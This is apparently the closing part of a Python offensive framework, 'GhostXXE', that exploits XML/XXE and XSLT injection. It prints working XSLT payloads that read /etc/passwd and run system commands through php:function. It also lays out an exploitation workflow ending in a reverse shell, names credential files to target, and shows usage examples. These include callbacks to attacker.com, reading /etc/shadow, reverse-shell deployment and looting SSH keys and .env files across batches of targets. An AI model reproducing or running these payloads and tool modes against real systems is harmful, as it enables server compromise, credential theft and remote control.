                print(f"{Colors.SUCCESS}╚═══════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
                
                print(f"{Colors.INFO}[*] XSLT file read detected - use these payloads to read files{Colors.RESET}\n")
                
                print(f"{Colors.WARNING}→ Method 1: php:function('file_get_contents'):{Colors.RESET}")
                print(f"   # Direct injection (works if input reflected in XSLT)")
                print(f'''   <xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
''')
                
                print(f"{Colors.WARNING}→ Method 2: XSLT document() function:{Colors.RESET}")
                print(f'''   # Full XSLT stylesheet
   <?xml version="1.0"?>
   <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
   <xsl:template match="/">
   <xsl:value-of select="document('/etc/passwd')"/>
   </xsl:template>
   </xsl:stylesheet>
''')
                
                print(f"{Colors.WARNING}→ Test through tool (advanced mode):{Colors.RESET}")
                print(f"   # Run comprehensive XSLT tests")
                print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
                print(f"       --advanced -v\n")
                
                print(f"{Colors.WARNING}→ Manual testing with Burp:{Colors.RESET}")
                print(f"   # Intercept and modify requests")
                print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
                print(f"       --proxy http://127.0.0.1:8080 --advanced -v\n")
                
                print(f"{Colors.INFO}   Files to target:{Colors.RESET}")
                print(f"   • /etc/passwd - User accounts")
                print(f"   • /etc/hostname - System hostname")
                print(f"   • /var/www/html/config.php - PHP configs")
                print(f"   • database.php, connection.php - DB credentials")
                print(f"   • .env - Environment variables\n")
            
            # XSLT RCE Commands
            if xslt_rce:
                print(f"{Colors.SUCCESS}╔═══════════════════════════════════════════════════════════════╗{Colors.RESET}")
                print(f"{Colors.ERROR}║ XSLT INJECTION - REMOTE CODE EXECUTION (RCE)  ⚠ CRITICAL    ║{Colors.RESET}")
                print(f"{Colors.SUCCESS}╚═══════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
                
                print(f"{Colors.ERROR}[!] CRITICAL: PHP functions enabled - RCE possible!{Colors.RESET}\n")
                
                print(f"{Colors.WARNING}→ Test Command Execution:{Colors.RESET}")
                print(f"   # Execute 'id' command")
                print(f'''   <xsl:value-of select="php:function('system','id')" />
''')
                
                print(f"   # Execute 'whoami' command")
                print(f'''   <xsl:value-of select="php:function('system','whoami')" />
''')
                
                print(f"   # List directory")
                print(f'''   <xsl:value-of select="php:function('system','ls -la')" />
''')
                
                print(f"{Colors.WARNING}→ Full XSLT RCE Payload:{Colors.RESET}")
                print(f'''   <?xml version="1.0"?>
   <xsl:stylesheet version="1.0" 
       xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
       xmlns:php="http://php.net/xsl">
   <xsl:template match="/">
       <xsl:value-of select="php:function('system','cat /etc/passwd')" />
   </xsl:template>
   </xsl:stylesheet>
''')
                
                print(f"{Colors.WARNING}→ Test through tool:{Colors.RESET}")
                print(f"   # Tool will automatically test RCE")
                print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
                print(f"       --advanced -v\n")
                
                print(f"{Colors.WARNING}→ Exploitation workflow:{Colors.RESET}")
                print(f"   1. Test basic command: system('id')")
                print(f"   2. Read sensitive files: system('cat /etc/passwd')")
                print(f"   3. Find web root: system('pwd')")
                print(f"   4. Read config files: system('cat config.php')")
                print(f"   5. Establish persistence (reverse shell)\n")
                
                print(f"{Colors.ERROR}   ⚠ CRITICAL IMPACT:{Colors.RESET}")
                print(f"   • Full system command execution")
                print(f"   • Read any file on the system")
                print(f"   • Potential for reverse shell")
                print(f"   • Complete server compromise\n")
            
            # XPATH Commands
            if xpath_vulns:
                print(f"{Colors.SUCCESS}╔═══════════════════════════════════════════════════════════════╗{Colors.RESET}")
                print(f"{Colors.SUCCESS}║ XPATH INJECTION EXPLOITATION                                 ║{Colors.RESET}")
                print(f"{Colors.SUCCESS}╚═══════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
                
                print(f"{Colors.WARNING}→ Test through tool:{Colors.RESET}")
                print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
                print(f"       --advanced -v\n")
            
            # General recommendations
            print(f"{Colors.SUCCESS}╔═══════════════════════════════════════════════════════════════╗{Colors.RESET}")
            print(f"{Colors.SUCCESS}║ GENERAL RECOMMENDATIONS                                       ║{Colors.RESET}")
            print(f"{Colors.SUCCESS}╚═══════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
            
            print(f"{Colors.WARNING}→ Use Burp Suite for fine-tuning:{Colors.RESET}")
            print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
            print(f"       --proxy http://127.0.0.1:8080 -v\n")
            
            print(f"{Colors.WARNING}→ Save results for reporting:{Colors.RESET}")
            print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
            print(f"       --advanced -v -o results.json\n")
            
            print(f"{Colors.INFO}   Tips:{Colors.RESET}")
            print(f"   • Always validate findings manually")
            print(f"   • Test in Burp to see exact requests/responses")
            print(f"   • Save proof-of-concept for reporting")
            print(f"   • Document severity and impact\n")
            
        else:
            print(f"{Colors.WARNING}[-] No vulnerabilities detected{Colors.RESET}")
            print(f"{Colors.INFO}[*] This doesn't mean the target is secure - try manual testing{Colors.RESET}")
            
            print(f"\n{Colors.WARNING}→ TROUBLESHOOTING:{Colors.RESET}")
            print(f"   • Verify endpoint accepts XML: curl -X POST {self.target_url}")
            print(f"   • Check Content-Type header requirements")
            print(f"   • Try with verbose mode: -v")
            print(f"   • Use Burp proxy to inspect: --proxy http://127.0.0.1:8080")
            print(f"   • Test manually with simple XML first\n")
        
        print(f"{Colors.HEADER}{'='*70}{Colors.RESET}\n")


def main():
    """Main function"""
    parser = argparse.ArgumentParser(
        description='GhostXXE - Advanced XML Exploitation Framework | Ghost Ops Security',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Vulnerability discovery scan (test if vulnerable)
  python3 ghostxxxe.py -u http://target.com/api -m POST --scan
  
  # Scan multiple targets from file
  python3 ghostxxxe.py -l targets.txt -m POST --scan
  
  # Batch scan with multiple threads
  python3 ghostxxxe.py -l targets.txt -m POST --scan --threads 5
  
  # Basic XXE exploitation scan
  python3 ghostxxxe.py -u http://target.com/api -m POST
  
  # OOB exploitation with callback
  python3 ghostxxxe.py -u http://target.com/api -m POST --oob --callback http://attacker.com:8080
  
  # Test specific file read
  python3 ghostxxxe.py -u http://target.com/api -m POST -f /etc/shadow
  
  # Interactive shell mode
  python3 ghostxxxe.py -u http://target.com/api -m POST --interactive
  
  # Deploy reverse shell
  python3 ghostxxxe.py -u http://target.com/api -m POST --reverse-shell --attacker-ip 10.0.0.1 --attacker-port 4444
  
  # Full scan with custom headers and proxy
  python3 ghostxxxe.py -u http://target.com/api -m POST -H "Authorization: Bearer token" --proxy http://127.0.0.1:8080 -v

  # Advanced scan + loot high-value files through the confirmed vector
  python3 ghostxxxe.py -u http://target.com/api -m POST --advanced --harvest --loot-dir ./loot

  # Sweep the host for other XML endpoints (SOAP/XML-RPC/SAML/feeds)
  python3 ghostxxxe.py -u http://target.com/api -m POST --enum-endpoints

👻 Ghost Ops Security - Where Hackers Fear to Tread 👻
        '''
    )
    
    # Required arguments
    parser.add_argument('-u', '--url', help='Target URL')
    parser.add_argument('-l', '--url-list', help='File containing list of target URLs (one per line)')
    
    # Optional arguments
    parser.add_argument('-m', '--method', default='POST', choices=['GET', 'POST'], 
                       help='HTTP method (default: POST)')
    parser.add_argument('-p', '--param', help='URL parameter name for GET requests')
    parser.add_argument('-f', '--file', default='/etc/passwd', 
                       help='File to read (default: /etc/passwd)')
    parser.add_argument('-H', '--headers', help='Custom headers (comma-separated, e.g. "Key:Value,Key2:Value2")')
    parser.add_argument('-c', '--cookies', help='Cookies (semicolon-separated)')
    parser.add_argument('-t', '--timeout', type=int, default=10, help='Request timeout (default: 10)')
    parser.add_argument('--proxy', help='Proxy URL (e.g. http://127.0.0.1:8080)')
    parser.add_argument('--threads', type=int, default=1, help='Number of threads for batch scanning (default: 1)')
    
    # OOB options
    parser.add_argument('--oob', action='store_true', help='Enable Out-of-Band exploitation')
    parser.add_argument('--callback', help='Callback URL for OOB (e.g. http://attacker.com)')
    parser.add_argument('--callback-ip', help='Callback IP for OOB server')
    parser.add_argument('--callback-port', type=int, help='Callback port for OOB server (default: 8080)')
    
    # Exploitation modes
    parser.add_argument('--interactive', action='store_true', help='Interactive command execution mode')
    parser.add_argument('--reverse-shell', action='store_true', help='Deploy reverse shell')
    parser.add_argument('--attacker-ip', help='Attacker IP for reverse shell')
    parser.add_argument('--attacker-port', type=int, help='Attacker port for reverse shell')
    
    # Scan options
    parser.add_argument('--scan', action='store_true',
                       help='Run vulnerability discovery scan (tests if endpoint is vulnerable)')
    parser.add_argument('--advanced', action='store_true',
                       help='Run advanced tests (local DTD enumeration, extended XSLT)')
    parser.add_argument('--skip-dos', action='store_true',
                       help='Skip DoS tests (recommended for production)')
    parser.add_argument('--harvest', action='store_true',
                       help='After confirming XXE, loot high-value files (passwd, SSH keys, '
                            'configs, .env) through the working vector into --loot-dir')
    parser.add_argument('--enum-endpoints', action='store_true',
                       help='Sweep the target host for other XML-consuming endpoints '
                            '(SOAP, XML-RPC, SAML, feeds)')
    parser.add_argument('--loot-dir', default='./loot',
                       help='Directory for harvested files (default: ./loot)')
    
    # Output options
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('-o', '--output', help='Save results to JSON file')
    
    args = parser.parse_args()
    
    # Validate arguments
    if not args.url and not args.url_list:
        parser.error("Either -u/--url or -l/--url-list is required")
    
    if args.url and args.url_list:
        parser.error("Cannot use both -u/--url and -l/--url-list at the same time")
    
    # Display banner
    Banner.show()
    
    # Handle URL list (batch scanning)
    if args.url_list:
        try:
            with open(args.url_list, 'r') as f:
                urls = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            
            if not urls:
                print(f"{Colors.ERROR}[-] No valid URLs found in {args.url_list}{Colors.RESET}")
                return
            
            print(f"{Colors.INFO}[*] Loaded {len(urls)} URLs from {args.url_list}{Colors.RESET}")
            print(f"{Colors.INFO}[*] Starting batch scan with {args.threads} thread(s)...{Colors.RESET}\n")
            
            # Scan each URL
            results_summary = []
            for idx, url in enumerate(urls, 1):
                print(f"\n{Colors.HEADER}{'='*70}{Colors.RESET}")
                print(f"{Colors.HEADER}[{idx}/{len(urls)}] Scanning: {url}{Colors.RESET}")
                print(f"{Colors.HEADER}{'='*70}{Colors.RESET}\n")
                
                # Create a copy of args with the current URL
                import copy
                url_args = copy.copy(args)
                url_args.url = url
                
                try:
                    scanner = XXEScanner(url_args)
                    
                    if args.scan:
                        results = scanner.discover_xxe_vulnerability()
                        scanner.print_vulnerability_report(results)
                        results_summary.append({
                            'url': url,
                            'status': results['status'],
                            'vulnerabilities': results.get('vulnerability_types', []),
                            'severity': results.get('severity', 'NONE')
                        })
                    elif args.reverse_shell:
                        if not args.attacker_ip or not args.attacker_port:
                            print(f"{Colors.ERROR}[-] --attacker-ip and --attacker-port required{Colors.RESET}")
                            continue
                        scanner.deploy_reverse_shell(args.attacker_ip, args.attacker_port)
                    elif args.interactive:
                        scanner.interactive_exploit()
                    elif args.oob:
                        scanner.exploit_oob_http()
                    else:
                        scanner.run_scan(include_advanced=args.advanced)
                    
                    # Save individual results
                    if args.output and scanner.vulnerabilities_found:
                        output_file = f"{args.output}_{idx}_{url.replace('://', '_').replace('/', '_')}.json"
                        with open(output_file, 'w') as f:
                            json.dump(scanner.vulnerabilities_found, f, indent=2)
                        print(f"{Colors.SUCCESS}[+] Results saved to: {output_file}{Colors.RESET}")
                
                except Exception as e:
                    print(f"{Colors.ERROR}[-] Error scanning {url}: {str(e)}{Colors.RESET}")
                    if args.verbose:
                        import traceback
                        traceback.print_exc()
                    results_summary.append({
                        'url': url,
                        'status': 'ERROR',
                        'error': str(e)
                    })
            
            # Print summary
            print(f"\n{Colors.HEADER}{'='*70}{Colors.RESET}")
            print(f"{Colors.HEADER}BATCH SCAN SUMMARY{Colors.RESET}")
            print(f"{Colors.HEADER}{'='*70}{Colors.RESET}\n")
            
            vulnerable_count = sum(1 for r in results_summary if r.get('status') == 'VULNERABLE')
            not_vulnerable_count = sum(1 for r in results_summary if r.get('status') == 'NOT VULNERABLE')
            error_count = sum(1 for r in results_summary if r.get('status') == 'ERROR')
            
            print(f"{Colors.INFO}Total Scanned: {len(urls)}{Colors.RESET}")
            print(f"{Colors.ERROR}Vulnerable: {vulnerable_count}{Colors.RESET}")
            print(f"{Colors.SUCCESS}Not Vulnerable: {not_vulnerable_count}{Colors.RESET}")
            print(f"{Colors.WARNING}Errors: {error_count}{Colors.RESET}\n")
            
            if vulnerable_count > 0:
                print(f"{Colors.ERROR}VULNERABLE TARGETS:{Colors.RESET}")
                for r in results_summary:
                    if r.get('status') == 'VULNERABLE':
                        vulns = ', '.join(r.get('vulnerabilities', []))
                        print(f"  • {r['url']} - {r.get('severity', 'UNKNOWN')} - [{vulns}]")
            
            # Save summary
            if args.output:
                summary_file = f"{args.output}_summary.json"
                with open(summary_file, 'w') as f:
                    json.dump(results_summary, f, indent=2)
                print(f"\n{Colors.SUCCESS}[+] Summary saved to: {summary_file}{Colors.RESET}")
        
        except FileNotFoundError:
            print(f"{Colors.ERROR}[-] File not found: {args.url_list}{Colors.RESET}")
            return
        except Exception as e:
            print(f"{Colors.ERROR}[-] Error reading URL list: {str(e)}{Colors.RESET}")
            return
    
    # Handle single URL
    else:
        # Initialize scanner
        scanner = XXEScanner(args)
    
    try:
        # Check mode
        if args.scan:
            # Run vulnerability discovery scan only
            results = scanner.discover_xxe_vulnerability()
            scanner.print_vulnerability_report(results)
            
        elif args.reverse_shell:
            if not args.attacker_ip or not args.attacker_port:
                print(f"{Colors.ERROR}[-] --attacker-ip and --attacker-port required for reverse shell{Colors.RESET}")
                return
            scanner.deploy_reverse_shell(args.attacker_ip, args.attacker_port)
            
        elif args.interactive:
            scanner.interactive_exploit()
            
        elif args.oob:
            scanner.exploit_oob_http()
            
        else:
            # Run full scan
            scanner.run_scan(include_advanced=args.advanced)
        
        # Save results if requested
        if args.output and scanner.vulnerabilities_found:
            with open(args.output, 'w') as f:
                json.dump(scanner.vulnerabilities_found, f, indent=2)
            print(f"{Colors.SUCCESS}[+] Results saved to: {args.output}{Colors.RESET}")
    
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}[!] Scan interrupted by user{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.ERROR}[-] Error: {str(e)}{Colors.RESET}")
        if args.verbose:
            import traceback
            traceback.print_exc()


if __name__ == '__main__':
    main()
